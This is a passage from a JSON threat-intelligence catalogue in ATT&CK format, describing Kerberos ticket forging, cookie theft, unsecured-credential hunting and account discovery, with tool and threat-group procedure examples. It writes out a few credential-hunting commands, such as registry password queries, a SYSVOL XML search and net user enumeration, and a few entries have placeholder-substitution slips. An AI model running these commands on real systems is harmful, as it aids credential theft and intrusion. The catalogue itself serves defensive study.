                "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.[1] Golden tickets enable adversaries to generate authentication material for any account in Active Directory.[2] Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.[3]The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.[4] The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can leverage its implementation of Mimikatz to obtain and use golden tickets.[5]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used Mimikatz to generate Kerberos golden tickets.[6]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name>'s kerberos module can create golden tickets.[7][8]"
                    },
                    "S1071": {
                        "ID": "S1071",
                        "Name": "Rubeus",
                        "Description": "<name> can forge a ticket-granting ticket.[9]"
                    }
                }
            },
            "002": {
                "name": "Silver Ticket",
                "href": "/techniques/T1558/002",
                "description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.[1]Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.[2]Password hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account.[3]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can leverage its implementation of Mimikatz to obtain and use silver tickets.[4]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name>'s kerberos module can create silver tickets.[5]"
                    },
                    "S1071": {
                        "ID": "S1071",
                        "Name": "Rubeus",
                        "Description": "<name> can create silver tickets.[6]"
                    }
                }
            },
            "003": {
                "name": "Kerberoasting",
                "href": "/techniques/T1558/003",
                "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.[1][2] Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service[3]).[4][5][6][7]Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).[1][2] Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.[2][1] [7]This same behavior could be executed using service tickets captured from network traffic.[2]Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.[6]",
                "Procedure": {
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking.[8]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> uses PowerSploit's Invoke-Kerberoast to request service tickets and return crackable ticket hashes.[9]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used Kerberoasting PowerShell commands such as, Invoke-Kerberoast for credential access and to enable lateral movement.[10][11]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "<name> modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.[12]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.[13]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s Invoke-Kerberoast module can request service tickets and return crackable ticket hashes.[14][7]"
                    },
                    "S1071": {
                        "ID": "S1071",
                        "Name": "Rubeus",
                        "Description": "<name> can use the KerberosRequestorSecurityToken.GetRequest method to request kerberoastable service tickets.[15]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> contains a module to conduct Kerberoasting.[16]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.[17]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.[18][19][20][21][22]"
                    }
                }
            },
            "004": {
                "name": "AS-REP Roasting",
                "href": "/techniques/T1558/004",
                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages.[1] Preauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.[2]For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials. [1][3] An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. [1][3]Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.[4]",
                "Procedure": {
                    "S1071": {
                        "ID": "S1071",
                        "Name": "Rubeus",
                        "Description": "<name> can reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting.[5][6][7]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC).[1] Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.[2]Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.[3] On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in /var/lib/sss/secrets/secrets.ldb as well as the corresponding key located in /var/lib/sss/secrets/.secrets.mkey. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket. The ccache file may also be converted into a Windows format using tools such as Kekeo.[4][5][6]Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.[7][8]",
        "Procedure": {}
    },
    "T1539": {
        "ttp_name": "Steal Web Session Cookie",
        "ttp_id": "T1539",
        "href": "/techniques/T1539",
        "tactic": "Credential Access",
        "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.[1]There are several examples of malware targeting cookies from web browsers on the local system.[2][3] Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on User Execution by tricking victims into running malicious JavaScript in their browser.[4][5]There are also open source frameworks such as Evilginx2 and Muraena that can gather session cookies through a malicious proxy (e.g., Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns.[6][7]After an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.",
        "Procedure": {
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.[8]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has used a script that extracts the web session cookie and sends it to the C2 server.[9]"
            },
            "S0492": {
                "ID": "S0492",
                "Name": "CookieMiner",
                "Description": "malware can steal Google Chrome and Apple Safari browser cookies from the victim\u2019s machine. [10]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware can harvest cookies and upload them to the C2 server.[11]"
            },
            "G0120": {
                "ID": "G0120",
                "Name": "Evilnum",
                "Description": "malware can steal cookies and session information from browsers.[12]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can steal the victim's cookies to use for duplicating the active session from another device.[13]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has used an unnamed post-exploitation tool to steal cookies from the Chrome browser.[14]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has the ability to capture web session cookies.[15][16]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware used information stealer malware to collect browser session cookies.[17]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware retrieves browser cookies via Raccoon Stealer.[18]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users.[19]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.[2]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware uses scp to access the ~/Library/Cookies/Cookies.binarycookies file.[20]"
            }
        }
    },
    "T1552": {
        "ttp_name": "Unsecured Credentials",
        "ttp_id": "T1552",
        "href": "/techniques/T1552",
        "subtechnique": {
            "001": {
                "name": "Credentials In Files",
                "href": "/techniques/T1552/001",
                "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping.[1] Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.[2]In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.[3] They may also be found as parameters to deployment commands in container logs.[4] In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.[5]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can gather unsecured credentials for Azure AD services, such as Azure AD Connect, from a local machine.[6]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has the ability to extract credentials from configuration or support files.[7]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.[8]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used a variety of publicly available tools like LaZagne to gather credentials.[9][10]"
                    },
                    "S0344": {
                        "ID": "S0344",
                        "Name": "Azorult",
                        "Description": "<name> can steal credentials in files belonging to common software such as Skype, Telegram, and Steam.[11]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store.[12][13]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. [14][15]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use various modules to search for files containing passwords.[16]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has obtained administrative credentials by browsing through local files on a compromised machine.[17]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has accessed files to gain valid credentials.[18]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has searched for SSH keys, Docker credentials, and Kubernetes service tokens.[3]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> can capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk.[19]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used tools that are capable of obtaining credentials from saved mail.[20]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can obtain credentials from chats, databases, mail, and WiFi.[21]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used several tools for retrieving login and password information, including LaZagne.[22]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has run a tool that steals passwords saved in victim email.[23]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[24][25][26][27]"
                    },
                    "S0067": {
                        "ID": "S0067",
                        "Name": "pngdowner",
                        "Description": "If an initial connectivity check fails, <name> attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.[28]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> contains modules for searching for passwords in local and remote files.[29]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can use Lazagne for harvesting credentials.[30]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has extracted credentials from the password database before encrypting the files.[31]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> can obtain passwords from FTP clients.[32][33]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> Spider searches for credential storage documentation on a compromised host.[34]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> searches for files named logins.json to parse for credentials.[35]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used malware to gather credentials from FTP clients and Outlook.[36]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has searched for unsecured AWS credentials and Docker API credentials.[37][38][39]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP.[40][41] Additionally, it searches for the \".vnc.lnk\" affix to steal VNC credentials.[42]"
                    },
                    "S0117": {
                        "ID": "S0117",
                        "Name": "XTunnel",
                        "Description": "<name> is capable of accessing locally stored passwords on victims.[43]"
                    }
                }
            },
            "002": {
                "name": "Credentials in Registry",
                "href": "/techniques/T1552/002",
                "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: [1]Local Machine Hive: reg query HKLM /f password /t REG_SZ /sCurrent User Hive: reg query HKCU /f password /t REG_SZ /s",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has the ability to extract credentials from the Registry.[2]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> used Outlook Credential Dumper to harvest credentials stored in Windows registry.[3][4]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> can harvest credentials from local and remote host registries.[5]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile, Get-Webconfig, Get-ApplicationHost, Get-SiteListPassword, Get-CachedGPPPassword, and Get-RegistryAutoLogon.[1]"
                    },
                    "S0075": {
                        "ID": "S0075",
                        "Name": "Reg",
                        "Description": "<name> may be used to find credentials in the Windows <name>istry.[1]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has retrieved PuTTY credentials by querying the Software\\SimonTatham\\Putty\\Sessions registry key [6]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> can use the clientgrabber module to steal e-mail credentials from the Registry.[7]"
                    }
                }
            },
            "003": {
                "name": "Bash History",
                "href": "/techniques/T1552/003",
                "description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. [1]",
                "Procedure": {
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has searched bash_history for credentials.[2]"
                    }
                }
            },
            "004": {
                "name": "Private Keys",
                "href": "/techniques/T1552/004",
                "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.[1] Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:\\Users\\(username)\\.ssh\\ on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.[2][3]When a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity.[4] An adversary with access to the device may be able to export the keys in order to impersonate the device.[5]On network devices, private keys may be exported via Network Device CLI commands such as crypto pki export.[6] Some private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers.[7]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has intercepted unencrypted private keys as well as private key pass-phrases.[8]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use modules like Invoke-SessionGopher to extract private key and session information.[9]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> can retrieve token signing certificates and token decryption certificates from a compromised AD FS server.[10]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has searched for private keys in .ssh.[11]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> can steal keys for VPNs and cryptocurrency wallets.[12]"
                    },
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has searched for private keys.[13]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has scanned and looked for cryptographic keys and certificate file extensions.[14]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can collect a Chrome encryption key used to protect browser cookies.[15]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name>'s CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.[16]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store.[17]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has used SSH private keys on the infected machine to spread its coinminer throughout a network.[18]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> enumerate and exfiltrate code-signing certificates from a compromised host.[19]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.[20][21]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has searched for unsecured SSH keys.[22][23]"
                    }
                }
            },
            "005": {
                "name": "Cloud Instance Metadata API",
                "href": "/techniques/T1552/005",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.[1] A cloud metadata API has been used in at least one high profile compromise.[2]If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.[3]The de facto standard across cloud service providers is to host the Instance Metadata API at http[:]//169.254.169.254.",
                "Procedure": {
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has queried the Cloud Instance Metadata API for cloud credentials.[4]"
                    },
                    "S0683": {
                        "ID": "S0683",
                        "Name": "Peirates",
                        "Description": "<name> can query the query AWS and GCP metadata APIs for secrets.[5]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has queried the AWS instance metadata service for credentials.[6][7]"
                    }
                }
            },
            "006": {
                "name": "Group Policy Preferences",
                "href": "/techniques/T1552/006",
                "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.[1]These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).[2]The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:Metasploit\u2019s post exploitation module: post/windows/gather/credentials/gppGet-GPPPassword[3]gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml",
                "Procedure": {
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used a variety of publicly available tools like Gpppassword to gather credentials.[4][5]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.[6][7]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> has a module that can extract cached GPP passwords.[8]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used PowerShell cmdlets Get-GPPPassword and Find-GPOPassword to find unsecured credentials in a compromised network group policy.[9]"
                    }
                }
            },
            "007": {
                "name": "Container API",
                "href": "/techniques/T1552/007",
                "description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.[1][2]An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.[3] An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",
                "Procedure": {
                    "S0683": {
                        "ID": "S0683",
                        "Name": "Peirates",
                        "Description": "<name> can query the Kubernetes API for secrets.[4]"
                    }
                }
            },
            "008": {
                "name": "Chat Messages",
                "href": "/techniques/T1552/008",
                "description": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.Rather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation [1].",
                "Procedure": {
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement.[2]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry),  or other specialized files/artifacts (e.g. Private Keys).[1]",
        "Procedure": {
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware uses an external software known as NetPass to recover passwords. [2]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware uses NirSoft tools to steal user credentials from the infected machine.[3] NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe."
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates.[4]"
            }
        }
    },
    "T1087": {
        "ttp_name": "Account Discovery",
        "ttp_id": "T1087",
        "href": "/techniques/T1087",
        "subtechnique": {
            "001": {
                "name": "Local Account",
                "href": "/techniques/T1087/001",
                "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such as net user and net localgroup of the Net utility and id and groups on macOS and Linux can list local users and groups.[1][2][3] On Linux, local users can also be enumerated through the use of the /etc/passwd file. On macOS the dscl . list /Users command can be used to enumerate local accounts.",
                "Procedure": {
                    "G0018": {
                        "ID": "G0018",
                        "Name": "admin@338",
                        "Description": "<name> actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download[4]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> can collect account information from the victim\u2019s machine.[5]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> used the commands net localgroup,net user, and net group to find accounts on the system.[1]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has used a tool that can obtain info about local and global group users, power users, and administrators.[6]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> enumerated administrative users using the commands net localgroup administrators.[7]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used built-in net commands to enumerate local administrator groups.[8]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> gathers domain and account names/information through process monitoring.[9]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can identify administrator accounts on an infected host.[10]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> can enumerate the sessions for each user logged onto the infected host.[11]"
                    },
                    "S0521": {
                        "ID": "S0521",
                        "Name": "BloodHound",
                        "Description": "<name> can identify users with local administrator rights.[12]"
                    },
                    "G0114": {
                        "ID": "G0114",
